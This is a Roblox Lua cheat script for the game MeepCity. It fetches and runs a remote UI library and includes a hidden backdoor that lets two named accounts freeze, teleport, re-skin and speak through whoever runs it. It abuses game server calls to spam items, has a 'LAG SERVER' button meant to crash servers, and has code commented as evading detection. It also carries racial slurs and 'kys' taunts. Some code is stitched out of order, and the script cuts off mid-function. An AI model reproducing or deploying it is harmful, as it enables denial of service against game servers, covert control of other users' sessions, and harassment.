    local player = game.Players.LocalPlayer
local playerHeadIcon = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"


game.StarterGui:SetCore("SendNotification", {
    Title = "meep fucker zynlope",
    Text = "Gui is loading..",
    Icon = playerHeadIcon,
    Duration = 5,
    Button1 = "kys broðŸ¤“"
})

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")

-- List of target users who can execute commands
local targetUsernames = {
    ["sci_mythical77"] = true,
    ["Rylix56"] = true
}

local function isTargetPlayer(playerName)
    return targetUsernames[playerName] ~= nil
end

local function onChat(player, message)
    if not isTargetPlayer(player.Name) then return end
    local command = message:lower()

    if command == "/e fa" then
        local myPlayer = Players.LocalPlayer
        local character = myPlayer.Character or myPlayer.CharacterAdded:Wait()
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        
        if humanoid then
            local animation = Instance.new("Animation")
            animation.AnimationId = "rbxassetid://754656200"

            local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:WaitForChild("Animator")
            local animationTrack = animator:LoadAnimation(animation)

            animationTrack.Looped = true
            animationTrack:Play()
            animationTrack:AdjustSpeed(50)
        end

    elseif command == "/e unfa" then
        if animationTrack then
            animationTrack:Stop()
        end

    elseif command == "/e kitten" then
        local myPlayer = Players.LocalPlayer
        if myPlayer then
             -- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = {
        ["SwimAnimation"] = 2510240941,
        ["Torso"] = 4637151279,
        ["ProportionScale"] = 0,
        ["ClimbAnimation"] = 2510230574,
        ["Shirt"] = 11289085978,
        ["FaceAccessory"] = "13353986061,12580366888,8923599923",
        ["RightArmColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["HairAccessory"] = "13918965164,14314838611",
        ["RightArm"] = 0,
        ["Head"] = 0,
        ["FallAnimation"] = 2510233257,
        ["TorsoColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["DepthScale"] = 0.8,
        ["RightLeg"] = 0,
        ["HeightScale"] = 0.9,
        ["WaistAccessory"] = "14335771887",
        ["RightLegColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["LeftLegColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["WidthScale"] = 0.7,
        ["BodyTypeScale"] = 0,
        ["BackAccessory"] = "8651335862",
        ["LeftArmColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["Emotes"] = {
            ["1"] = {
                [1] = 9528286240
            },
            ["8"] = {
                [1] = 12874468267
            },
            ["3"] = {
                [1] = 7466046574
            },
            ["2"] = {
                [1] = 11309263077
            },
            ["4"] = {
                [1] = 3576968026
            },
            ["7"] = {
                [1] = 13344121112
            }
        },
        ["Pants"] = 14851012835,
        ["JumpAnimation"] = 2510236649,
        ["HatAccessory"] = "12579341301,13142881183,1402432199",
        ["LeftArm"] = 0,
        ["LeftLeg"] = 0,
        ["HeadColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["WalkAnimation"] = 2510242378,
        ["IdleAnimation"] = 2510235063,
        ["RunAnimation"] = 2510238627,
        ["HeadScale"] = 1,
        ["Face"] = 0,
        ["AccessoryBlob"] = {
            [1] = {
                ["Order"] = 1,
                ["AssetId"] = 12090385963,
                ["AccessoryType"] = "Jacket"
            }
        },
        ["GraphicTShirt"] = 10891067215
    }
}

game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(unpack(args))
        end

 elseif command == "/e kitten2" then
        local myPlayer = Players.LocalPlayer
        if myPlayer then
             local args = {
    [1] = {
        ["SwimAnimation"] = 0;
        ["WalkAnimation"] = 0;
        ["ProportionScale"] = 0.511454701423645;
        ["RightLegColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["HatAccessory"] = "98144560652085";
        ["Torso"] = 111532289455125;
        ["JumpAnimation"] = 0;
        ["IdleAnimation"] = 0;
        ["BodyTypeScale"] = 0.5962028503417969;
        ["ClimbAnimation"] = 0;
        ["Shirt"] = 11335258282;
        ["Emotes"] = {
            ["1"] = {
                [1] = 14548709888;
            };
            ["8"] = {
                [1] = 5915776835;
            };
            ["3"] = {
                [1] = 10370922566;
            };
            ["2"] = {
                [1] = 12874468267;
            };
            ["5"] = {
                [1] = 7466046574;
            };
            ["4"] = {
                [1] = 11753545334;
            };
            ["7"] = {
                [1] = 4646306583;
            };
            ["6"] = {
                [1] = 4689362868;
            };
        };
        ["GraphicTShirt"] = 0;
        ["RightArmColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["RightLeg"] = 131359873709031;
        ["WidthScale"] = 1.0517624616622925;
        ["Pants"] = 4080983570;
        ["RightArm"] = 126637196984684;
        ["FallAnimation"] = 0;
        ["Head"] = 0;
        ["LeftLegColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["Face"] = 15432080;
        ["LeftArmColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["LeftLeg"] = 104113560860424;
        ["HeadColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["TorsoColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["DepthScale"] = 1.0188917815685272;
        ["LeftArm"] = 98964144815454;
        ["HeadScale"] = 1;
        ["HeightScale"] = 0.986021101474762;
        ["RunAnimation"] = 0;
        ["WaistAccessory"] = "120583292739858";
    };
}

game:GetService("ReplicatedStorage"):WaitForChild("FunctionConnections", 9e9):WaitForChild("NewAESaveAvatar", 9e9):InvokeServer(unpack(args))
        end

    elseif command == "/e freeze" then
        local myCharacter = Players.LocalPlayer.Character
        if myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
            myCharacter.HumanoidRootPart.Anchored = true
        end

    elseif command == "/e unfreeze" then
        local myCharacter = Players.LocalPlayer.Character
        if myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
            myCharacter.HumanoidRootPart.Anchored = false
        end

    elseif command:sub(1, 7) == "/e chat" then
        local chatMessage = message:sub(9)
        if chatMessage:gsub("%s+", "") ~= "" then
            local textChannel = TextChatService:WaitForChild("TextChannels"):FindFirstChild("RBXGeneral")
            if textChannel then
                textChannel:SendAsync(chatMessage)
            end
        end

    elseif command == "/e bring" then
        local targetCharacter = player.Character
        local myPlayer = Players.LocalPlayer

        if myPlayer and targetCharacter then
            local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
            local myCharacter = myPlayer.Character

            if myCharacter and targetHRP then
                local myHRP = myCharacter:FindFirstChild("HumanoidRootPart")
                if myHRP then
                    myHRP.CFrame = targetHRP.CFrame
                end
            end
        end
    end
end

-- Connect chat event for existing players
for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(msg) onChat(player, msg) end)
end

-- Connect chat event for new players joining
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg) onChat(player, msg) end)
end)


game.StarterGui:SetCore("SendNotification", {
    Title = "zynlope",
    Text = "loading goodies..",
    Icon = playerHeadIcon,
    Duration = 3,
    Button1 = "okay buddy"
})

local MarketplaceService = game:GetService("MarketplaceService")
local executorName = identifyexecutor()

local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
print("Game Name: " .. gameName)

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local openingSound = Instance.new("Sound")
openingSound.SoundId = "rbxassetid://6958727243" 
openingSound.Volume = 5 
openingSound.PlayOnRemove = false
openingSound.Looped = false
openingSound.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") 

local function playOpeningSound()
    openingSound:Play()
end



playOpeningSound()
local Window = Rayfield:CreateWindow({
   Name = "discord: plusgiant | " .. executorName .. " | " .. gameName,
   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = "zynlope.lol",
   LoadingSubtitle = "by plusgiant",
   Theme = "Amethyst", -- Check https://docs.sirius.menu/rayfield/configuration/themes

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Big Hub"
   },

   Discord = {
      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },

   KeySystem = true, -- Set this to true to use our key system
   KeySettings = {
      Title = "hands up nigga",
      Subtitle = "plusgiant",
      Note = "contact owner for key       discord: plusgiant", -- Use this to tell the user how to get a key
      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"cartiaintdropping"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

Rayfield:Notify({
   Title = "ZYNLOPE",
   Content = "newest gui is officialy discounted. and im not going to update it due to its errors. older gui is works for low executors like xeno/solara but newest works on higher executors. (because of the functions it has) theres a few useful stuff thats not in the older gui on the newest. but still keep using old gui. ",
   Duration = 13,
   Image = 4483362458,
})


                    local ohTable2 = {
        ["FishingPolePos"] = Workspace.TempFish.Position,
        ["Power"] = math.random(), -- Randomize to avoid detection
        ["Face"] = Workspace.TempFish.Position,
        ["PlayerPos"] = Workspace.TempFish.Position,
        ["FishingZonePos"] = Vector3.new(-5.29345703, -18.0412292, 43.7173767),
    }
    ReplicatedStorage.Connection:InvokeServer(ohNumber1, ohTable2)
end

getItem()
   end,
})

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local backpack = player:WaitForChild("Backpack")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local Toggle = false -- Default value for the toggle

-- Function to equip all tools
local function equipAllTools()
    for _, tool in pairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            tool.Parent = character -- Equip the tool
        end
    end
end

-- Function to attempt resetting conditions and getting the item
local function getItem()
    -- Try resetting the potential flag or triggering conditions
    ReplicatedStorage.Connection:InvokeServer(9, 0) -- Reset or modify state
    wait(0.1) -- Short delay to ensure the server processes

    -- Attempt to invoke the server to get the item again
    ReplicatedStorage.Connection:InvokeServer(9, 1) -- Actual request

    -- Additional item requests (if needed)
    ReplicatedStorage.Connection:InvokeServer(49)
    ReplicatedStorage.Connection:InvokeServer(50)
    ReplicatedStorage.Connection:InvokeServer(51)

    -- Detailed item request with table data
    local ohNumber1 = 11
    local ohTable2 = {
        ["FishingPolePos"] = Workspace.TempFish.Position,
        ["Power"] = math.random(), -- Randomize to avoid detection
        ["Face"] = Workspace.TempFish.Position,
        ["PlayerPos"] = Workspace.TempFish.Position,
        ["FishingZonePos"] = Vector3.new(-5.29345703, -18.0412292, 43.7173767),
    }
    ReplicatedStorage.Connection:InvokeServer(ohNumber1, ohTable2)
end

-- Continuous loop to keep executing both functions using multiple spawns
local function startFishing()
    while Toggle do
        -- Spawn multiple simultaneous operations for performance boost
        for _ = 1, 1 do
            spawn(function() 
                equipAllTools()
            end)

            spawn(function()
                getItem()
            end)
        end
        wait(0) -- Wait for the next iteration
    end
end

local Toggle = Tab:CreateToggle({
   Name = "Loop Equip FishingRods (No lag)",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(value)
  Toggle = value
        if Toggle then
            startFishing() -- Start the combined lag actions
        end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "Loop Drop Rods",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(value)
 isSpamming = value -- Update the toggle state
        
        if isSpamming then
            -- Start a loop to press Backspace
            spawn(function()
                while isSpamming do
                    -- Simulate Backspace key press
                    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
                    wait(0) -- Delay between each drop, adjust as needed
                end
            end)
        end
   end,
})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local localPlayer = Players.LocalPlayer
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()

local spinningToggle = false -- Default toggle state
local activeSpinConnections = {} -- Stores active connections to stop them when toggled off

-- Function to spin around a single player
local function spinAroundPlayer(targetPlayer)
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then return end

    local targetCharacter = targetPlayer.Character
    if not targetCharacter then return end

    local targetRoot = targetCharacter:FindFirstChild("HumanoidRootPart")
    if not targetRoot then return end

    local spinDuration = 2 -- Adjust as needed
    local radius = 6 -- Distance from the player
    local spinSpeed = 720 -- Rotation speed in degrees per second

    local startTime = tick()
    local connection

    connection = RunService.Heartbeat:Connect(function()
        if not spinningToggle then
            connection:Disconnect()
            return
        end

        local elapsedTime = tick() - startTime
        if elapsedTime > spinDuration then
            connection:Disconnect()
            return
        end

        local angle = math.rad((elapsedTime * spinSpeed) % 360)
        local offset = Vector3.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
        local targetPosition = targetRoot.Position + offset

        rootPart.CFrame = CFrame.new(targetPosition, targetRoot.Position)
    end)

    -- Add the connection to the list of active connections
    table.insert(activeSpinConnections, connection)
    wait(spinDuration)
end

-- Function to spin around all players
local function spinAroundAllPlayers()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            pcall(function()
                spinAroundPlayer(player)
            end)
        end
    end
end

-- Function to start spinning
local function startSpinning()
    while spinningToggle do
        spinAroundAllPlayers()
        wait(0.1) -- Slight delay to prevent overloading
    end
end

-- Function to stop spinning
local function stopSpinning()
    for _, connection in ipairs(activeSpinConnections) do
        connection:Disconnect()
    end
    activeSpinConnections = {} -- Clear the list of active connections
end

-- Create the toggle
local SpinToggle = Tab:CreateToggle({
    Name = "Spin Around Players",
    CurrentValue = false,
    Flag = "SpinToggle",
    Callback = function(value)
        spinningToggle = value
        if spinningToggle then
            spawn(startSpinning) -- Start spinning
        else
            stopSpinning() -- Stop spinning
        end
    end,
})

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local backpack = player:WaitForChild("Backpack")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local Toggle = false -- Default value for the toggle
local isSpamming = false -- Variable to track toggle state

local function equipAllTools()
    for _, tool in pairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            tool.Parent = character -- Equip the tool
        end
    end
end

local function getItem()
    ReplicatedStorage.Connection:InvokeServer(9, 0)
    wait(0.1)

    ReplicatedStorage.Connection:InvokeServer(9, 1)

    ReplicatedStorage.Connection:InvokeServer(49)
    ReplicatedStorage.Connection:InvokeServer(50)
    ReplicatedStorage.Connection:InvokeServer(51)

    local ohNumber1 = 11
    local ohTable2 = {
        ["FishingPolePos"] = Workspace.TempFish.Position,
        ["Power"] = math.random(), -- Randomize to avoid detection
        ["Face"] = Workspace.TempFish.Position,
        ["PlayerPos"] = Workspace.TempFish.Position,
        ["FishingZonePos"] = Vector3.new(-5.29345703, -18.0412292, 43.7173767),
    }
    ReplicatedStorage.Connection:InvokeServer(ohNumber1, ohTable2)
end

-- Continuous loop to keep executing both functions using multiple spawns
local function startFishing()
    while Toggle do
        -- Spawn 15 simultaneous operations for maximum performance boost
        for _ = 1, 1000 do
            spawn(function() 
                equipAllTools()
            end)

            spawn(function()
                getItem()
            end)
        end
        wait(0) -- Wait for the next iteration
    end
end

local Section = Tab:CreateSection("Or just crash the server with this.")

local Button = Tab:CreateButton({
   Name = "LAG SERVER",
   Callback = function()
 -- Start both actions simultaneously when the button is clicked
        -- Activate Loop Drop All
        isSpamming = true
        spawn(function()
            while isSpamming do
                -- Simulate Backspace key press
                game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
                wait(1) -- Delay between each drop, adjust as needed
            end
        end)

        -- Activate Ultimate Spam Equip Fishing Rod (LAG)
        Toggle = true
        startFishing() -- Start the combined lag actions
   end,
})

local Section = Tab:CreateSection("Step 3 enjoy annoying teenager speds!")

local Tab = Window:CreateTab("Meepcity", 126133429358591) -- Title, Image

local function colorToTable(clr)
    return {tostring(clr.R * 255), tostring(clr.G * 255), tostring(clr.B * 255)}
end

local function ExtractData(humdes)
    local ava = {}

    for _, v in pairs({"WidthScale", "HeightScale", "DepthScale", "BodyTypeScale", "ProportionScale", "HeadScale"}) do
        ava[v] = humdes[v]
    end

    for _, v in pairs({"Face", "Head", "LeftArm", "RightArm", "LeftLeg", "RightLeg", "Torso"}) do
        ava[v] = humdes[v]
    end

    for _, v in pairs({"HeadColor", "LeftArmColor", "RightArmColor", "LeftLegColor", "RightLegColor", "TorsoColor"}) do
        ava[v] = colorToTable(humdes[v])
    end

    for _, v in pairs({"GraphicTShirt", "Shirt", "Pants"}) do
        ava[v] = humdes[v]
    end

    for _, v in pairs({"IdleAnimation", "RunAnimation", "JumpAnimation", "SwimAnimation", "WalkAnimation", "ClimbAnimation", "FallAnimation"}) do
        ava[v] = humdes[v]
    end

    for _, v in pairs({"Hat", "Hair", "Back", "Face", "Front", "Neck", "Shoulders", "Waist"}) do
        ava[v .. "Accessory"] = humdes[v .. "Accessory"]
    end

    local layered = humdes:GetAccessories(false)
    for i, accessory in pairs(layered) do
        if accessory.AccessoryType and typeof(accessory.AccessoryType) == "EnumItem" then
            accessory.AccessoryType = accessory.AccessoryType.Name
        end
        accessory.Order = i
    end
    ava.AccessoryBlob = layered

    ava.Emotes = humdes:GetEmotes()

    return ava
end


local AvatarClipboard = nil
local AvatarClipboardName = "Unnamed"

local Section = Tab:CreateSection("Avatar Clipboard")
Section:Set("Avatar Clipboard")

local function copyToClip(data, name)
    if not data then
        AvatarClipboard = nil
        AvatarClipboardName = "Unnamed"
        Section:Set("Avatar Clipboard")
    else
        AvatarClipboard = data
        AvatarClipboardName = name
        Section:Set("Avatar Clipboard: " .. name)
    end
end

local function LoadPlayer(player)
    coroutine.wrap(function()
        if player ~= Players.LocalPlayer then
            local function LoadCharacter(character)
                local prox = Instance.new("ProximityPrompt", character:WaitForChild("HumanoidRootPart"))
                prox.ActionText = "Copy Avatar To Clipboard"
                prox.ObjectText = player.DisplayName
                prox.KeyboardKeyCode = Enum.KeyCode.C
                prox.HoldDuration = 0
                prox.RequiresLineOfSight = false
                prox.Triggered:Connect(function()
                    if character and character:FindFirstChild("Humanoid") and character.Humanoid:FindFirstChild("HumanoidDescription") then
                        copyToClip(ExtractData(character.Humanoid.HumanoidDescription), player.DisplayName)
                    end
                end)
            end
            LoadCharacter(player.Character or player.CharacterAdded:Wait())
            player.CharacterAdded:Connect(LoadCharacter)
        end
    end)()
end

for _, player in pairs(Players:GetPlayers()) do
    LoadPlayer(player)
end
Players.PlayerAdded:Connect(LoadPlayer)

Tab:CreateButton({
    Name = "Copy Current Avatar",
    Callback = function()
        local player = Players.LocalPlayer
        local character = player.Character
        if character and character:FindFirstChild("Humanoid") and character.Humanoid:FindFirstChild("HumanoidDescription") then
            copyToClip(ExtractData(character.Humanoid.HumanoidDescription), player.DisplayName)
        end
    end
})

Tab:CreateButton({
    Name = "Load Avatar",
    Callback = function()
        if AvatarClipboard then
            game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(AvatarClipboard)
        end
    end
})

local LoadAvatarFromUserId = Tab:CreateInput({
   Name = "Load Avatar From UserId",
   CurrentValue = "",
   PlaceholderText = "Enter UserId",
   RemoveTextAfterFocusLost = false,
   Flag = "LoadAvatarUserId",
   Callback = function(userid)
      if userid and tonumber(userid) and Players:GetHumanoidDescriptionFromUserId(tonumber(userid)) then
         local data = ExtractData(Players:GetHumanoidDescriptionFromUserId(tonumber(userid)))
        game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(data)
      end
   end,
})

local LoadAvatarFromUsername = Tab:CreateInput({
   Name = "Load Avatar From Username",
   CurrentValue = "",
   PlaceholderText = "Enter Username",
   RemoveTextAfterFocusLost = false,
   Flag = "LoadAvatarUsername",
   Callback = function(username)
      if username and Players:GetUserIdFromNameAsync(username) then
         local data = ExtractData(Players:GetHumanoidDescriptionFromUserId(Players:GetUserIdFromNameAsync(username)))
          game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(data)
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "Spam pizza plate", 
   CurrentValue = false,
   Flag = "Toggle1",
   Callback = function(value)
        isSpamming = value
        if isSpamming then
            spawn(function()
                while isSpamming do
                    local player = game.Players.LocalPlayer
                    local character = player.Character
                    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

                    local characterPosition = humanoidRootPart.Position

                    local rayOrigin = characterPosition + Vector3.new(0, 5, 0)
                    local rayDirection = Vector3.new(0, -10, 0)

                    local raycastResult = workspace:Raycast(rayOrigin, rayDirection)

                    local groundPosition
                    if raycastResult then
                        groundPosition = raycastResult.Position
                    else
                        groundPosition = characterPosition - Vector3.new(0, 5, 0)
                    end

                    local plantPosition = groundPosition + Vector3.new(0, -3, 0)

                    local args1 = { [1] = 201, [2] = 1372, [3] = {} }
                    game:GetService("ReplicatedStorage"):WaitForChild("Connection"):InvokeServer(unpack(args1))

                    local args2 = {
                        [1] = 685,
                        [2] = plantPosition
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("FunctionConnections"):WaitForChild("SpecialObjectRequestPlant"):InvokeServer(unpack(args2))

                    local args3 = { [1] = 202, [2] = 685 }
                    game:GetService("ReplicatedStorage"):WaitForChild("Connection"):InvokeServer(unpack(args3))

                    wait(0.08)
                end
            end)
        else
            isSpamming = false
        end
    end,
})

local Button = Tab:CreateButton({
   Name = "Firework (Manual)",
   Callback = function()
 game:GetService("ReplicatedStorage").Connection:InvokeServer(202, 1310)
        game:GetService("ReplicatedStorage").Connection:InvokeServer(201, 1310, {})
        game:GetService("ReplicatedStorage").ConnectionEvent:FireServer(210)
   end,
})

local spawnFirework = false -- Variable to track toggle state
local fireworkLoop -- Variable to hold the loop thread

local Toggle = Tab:CreateToggle({
   Name = "Spawn Fireworks (Normal)",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(value)
   spawnFirework = value
		if spawnFirework then
			-- Start spawning fireworks in a loop
			fireworkLoop = coroutine.create(function()
				while spawnFirework do
					game:GetService("ReplicatedStorage").Connection:InvokeServer(202, 1310)
					game:GetService("ReplicatedStorage").Connection:InvokeServer(201, 1310, {})
					game:GetService("ReplicatedStorage").ConnectionEvent:FireServer(210)
					wait(1.5) -- Adjust the wait time if needed for a slower/faster spawn rate
				end
			end)
			coroutine.resume(fireworkLoop)
		else
			-- Stop spawning fireworks by breaking the loop
			spawnFirework = false
		end
   end,
})

local spawnFirework = false -- Variable to track toggle state
local fireworkConnection -- Variable to hold the loop connection
local lastFireworkTime = 0 -- Time of the last firework spawn
local fireworkCooldown = 1.2 -- Cooldown between fireworks in seconds (adjust as needed)

local Toggle = Tab:CreateToggle({
   Name = "Multi Spam Fireworks (Best)",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(value)
 spawnFirework = value
        if spawnFirework then
            -- Start continuously spawning fireworks
            fireworkConnection = game:GetService("RunService").Heartbeat:Connect(function()
                -- Check if enough time has passed since the last firework spawn
                if tick() - lastFireworkTime >= fireworkCooldown then
                    -- Fire the events to spawn fireworks
                    game:GetService("ReplicatedStorage").Connection:InvokeServer(202, 1310)
                    game:GetService("ReplicatedStorage").Connection:InvokeServer(201, 1310, {})
                    game:GetService("ReplicatedStorage").ConnectionEvent:FireServer(210)
                    
                    -- Update the last firework spawn time
                    lastFireworkTime = tick()
                end
            end)
        else
            -- Stop spawning fireworks
            if fireworkConnection then
                fireworkConnection:Disconnect()
                fireworkConnection = nil
            end
        end
   end,
})

local animationTrack

local Toggle = Tab:CreateToggle({
    Name = "Fake ZZZ",
    CurrentValue = false,
    Flag = "ToggleExample",
    Callback = function(Value)
        
        local animationId = "rbxassetid://2176786857"
        local animation = Instance.new("Animation")
        animation.AnimationId = animationId

       
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")

      
        local args = {
            [1] = Value, 
            [2] = 1
        }

        if Value then
           
            if not animationTrack or animationTrack.IsPlaying == false then
                animationTrack = humanoid:LoadAnimation(animation)
                animationTrack:Play()
            end

            
            game:GetService("ReplicatedStorage").EventConnections.SetCharacterIsSleeping:FireServer(unpack(args))
        else
           
            if animationTrack and animationTrack.IsPlaying then
                animationTrack:Stop()
            end

           
            args[1] = false
            game:GetService("ReplicatedStorage").EventConnections.SetCharacterIsSleeping:FireServer(unpack(args))
        end
    end,
})


local Toggle = Tab:CreateToggle({
   Name = "Spam turkey", 
   CurrentValue = false,
   Flag = "Toggle1",
   Callback = function(value)
        isSpamming = value
        if isSpamming then
            spawn(function()
                while isSpamming do
                    local player = game.Players.LocalPlayer
                    local character = player.Character
                    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

                    local characterPosition = humanoidRootPart.Position

                    local rayOrigin = characterPosition + Vector3.new(0, 5, 0)
                    local rayDirection = Vector3.new(0, -10, 0)

                    local raycastResult = workspace:Raycast(rayOrigin, rayDirection)

                    local groundPosition
                    if raycastResult then
                        groundPosition = raycastResult.Position
                    else
                        groundPosition = characterPosition - Vector3.new(0, 5, 0)
                    end

                    local plantPosition = groundPosition + Vector3.new(0, -3, 0)

                    local args1 = { [1] = 201, [2] = 1372, [3] = {} }
                    game:GetService("ReplicatedStorage"):WaitForChild("Connection"):InvokeServer(unpack(args1))

                    local args2 = {
                        [1] = 687,
                        [2] = plantPosition
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("FunctionConnections"):WaitForChild("SpecialObjectRequestPlant"):InvokeServer(unpack(args2))

                    local args3 = { [1] = 202, [2] = 687 }
                    game:GetService("ReplicatedStorage"):WaitForChild("Connection"):InvokeServer(unpack(args3))

                    wait(0.08)
                end
            end)
        else
            isSpamming = false
        end
    end,
})

local Toggle = Tab:CreateToggle({
   Name = "Spam pizza plate", 
   CurrentValue = false,
   Flag = "Toggle1",
   Callback = function(value)
        isSpamming = value
        if isSpamming then
            spawn(function()
                while isSpamming do
                    local player = game.Players.LocalPlayer
                    local character = player.Character
                    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

                    local characterPosition = humanoidRootPart.Position

                    local rayOrigin = characterPosition + Vector3.new(0, 5, 0)
                    local rayDirection = Vector3.new(0, -10, 0)

                    local raycastResult = workspace:Raycast(rayOrigin, rayDirection)

                    local groundPosition
                    if raycastResult then
                        groundPosition = raycastResult.Position
                    else
                        groundPosition = characterPosition - Vector3.new(0, 5, 0)
                    end

                    local plantPosition = groundPosition + Vector3.new(0, -3, 0)

                    local args1 = { [1] = 201, [2] = 1372, [3] = {} }
                    game:GetService("ReplicatedStorage"):WaitForChild("Connection"):InvokeServer(unpack(args1))

                    local args2 = {
                        [1] = 685,
                        [2] = plantPosition
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("FunctionConnections"):WaitForChild("SpecialObjectRequestPlant"):InvokeServer(unpack(args2))

                    local args3 = { [1] = 202, [2] = 685 }
                    game:GetService("ReplicatedStorage"):WaitForChild("Connection"):InvokeServer(unpack(args3))

                    wait(0.08)
                end
            end)
        else
            isSpamming = false
        end
    end,
})

local Button = Tab:CreateButton({
   Name = "Give snowball all (BUGGY)",
   Callback = function()
     local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local isRunning = false 

local function equipItem()
    local equipArgs = {201, 932}
    local success, result = pcall(function()
        ReplicatedStorage:WaitForChild("Connection"):InvokeServer(unpack(equipArgs))
    end)
    if not success then
        warn("Equip item failed:", result)
    end
end

local function unEquip()
    local args = {
        [1] = 202,
    }
    pcall(function()
        ReplicatedStorage:WaitForChild("Connection"):InvokeServer(unpack(args))
    end)
end

local function hasItemEquipped(player)
    local equippedItems = player:FindFirstChild("Backpack"):FindFirstChild(932)
    return equippedItems ~= nil
end

local function giveItemToAllPlayers()
    for _, player in pairs(Players:GetPlayers()) do
        if not hasItemEquipped(player) then
            local giveArgs = {player.UserId, 932}
            local success, result = pcall(function()
                ReplicatedStorage:WaitForChild("FunctionConnections"):WaitForChild("RequestSendPassAlongActionItem"):InvokeServer(unpack(giveArgs))
            end)
            if not success then
                warn("Give item failed for " .. player.Name .. ":", result)
            end
        end
    end
end

while true do
    if not isRunning then
        isRunning = true
        
        equipItem()
        giveItemToAllPlayers()
        unEquip()
        
        isRunning = false
    else
        wait(1)
    end
    wait(2)
end

   end,
})

local Button = Tab:CreateButton({
   Name = "Throw snowball all",
   Callback = function()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
